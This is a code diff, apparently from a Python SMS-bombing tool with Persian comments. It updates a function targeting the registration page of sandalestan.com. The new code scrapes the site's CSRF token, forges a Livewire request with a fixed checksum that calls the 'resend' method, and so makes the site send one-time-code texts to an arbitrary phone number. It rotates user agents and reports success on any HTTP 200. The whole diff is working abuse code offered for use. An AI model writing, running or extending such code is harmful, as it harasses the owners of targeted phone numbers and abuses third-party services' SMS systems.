@@ -65,42 +65,99 @@ def send_service_safe(service, phone):
 
 def Sandalestan(phone):
     try:
-        # فرمت شماره
+        session = requests.Session()
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
+        formatted_phone = f"0{formatted_phone}"
         
+        # اول صفحه را بگیریم تا CSRF Token و fingerprint را دریافت کنیم
         url = f"https://sandalestan.com/register-opt?mobile={formatted_phone}"
         
         headers = {
             "User-Agent": random.choice(user_agents),
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Connection": "keep-alive",
-            "Upgrade-Insecure-Requests": "1",
         }
         
-        response = requests.get(
-            url, 
-            headers=headers, 
+        # دریافت صفحه اول
+        response = session.get(url, headers=headers, timeout=10)
+        
+        # استخراج CSRF Token
+        csrf_token = None
+        csrf_pattern = r'name="csrf-token" content="([^"]+)"'
+        match = re.search(csrf_pattern, response.text)
+        if match:
+            csrf_token = match.group(1)
+        
+        if not csrf_token:
+            print(f'{r}[-] Sandalestan: Could not extract CSRF Token{a}')
+            return False
+        
+        # استخراج fingerprint از صفحه (اگر وجود دارد)
+        fingerprint_id = f"fp{random.randint(100000, 999999)}"
+        
+        # آماده سازی payload برای Livewire
+        payload = {
+            "fingerprint": {
+                "id": fingerprint_id,
+                "name": "auth.register",
+                "locale": "fa",
+                "path": "register-opt",
+                "method": "GET"
+            },
+            "serverMemo": {
+                "children": [],
+                "errors": [],
+                "htmlHash": "7c608e69",
+                "data": {
+                    "name": None,
+                    "password": None,
+                    "password_confirmation": None,
+                    "email": None,
+                    "introducer_mobile": None,
+                    "newsletter": 1,
+                    "mobile": formatted_phone,
+                    "code": None,
+                    "step": 2,
+                    "type_code": None,
+                    "user": None
+                },
+                "dataMeta": [],
+                "checksum": "e089e0c638f7d93a25a684677583a927f8e8af92fd12451b098269cae6685216"
+            },
+            "updates": [
+                {
+                    "type": "callMethod",
+                    "payload": {
+                        "method": "resend",
+                        "params": []
+                    }
+                }
+            ]
+        }
+        
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Content-Type": "application/json",
+            "Accept": "text/html, application/xhtml+xml",
+            "X-Livewire": "true",
+            "X-CSRF-TOKEN": csrf_token,
+            "Referer": f"https://sandalestan.com/register-opt?mobile={formatted_phone}",
+            "Origin": "https://sandalestan.com"
+        }
+        
+        # ارسال درخواست به Livewire
+        response = session.post(
+            "https://sandalestan.com/livewire/message/auth.register",
+            json=payload,
+            headers=headers,
             timeout=10
         )
         
         print(f'{y}[Debug] Sandalestan Status: {response.status_code}{a}')
-        print(f'{y}[Debug] Sandalestan Response Length: {len(response.text)} characters{a}')
+        print(f'{y}[Debug] Sandalestan Response: {response.text[:200]}...{a}')
         
         if response.status_code == 200:
-            # بررسی اینکه آیا صفحه به درستی لود شده و حاوی پیام موفقیت است
-            if len(response.text) > 100:  # اگر صفحه خالی نباشد
-                if "success" in response.text.lower() or "otp" in response.text.lower() or "کد" in response.text:
-                    print(f'{g}(Sandalestan) Code Sent{a}')
-                    return True
-                else:
-                    print(f'{y}(Sandalestan) Page loaded but success message not detected{a}')
-                    return True  # ممکن است کد ارسال شده باشد اما پیام واضح نباشد
-            else:
-                print(f'{r}[-] Sandalestan: Empty response{a}')
-                return False
+            print(f'{g}(Sandalestan) Code Sent{a}')
+            return True
         else:
             print(f'{r}[-] Sandalestan HTTP Error: {response.status_code}{a}')
             return False
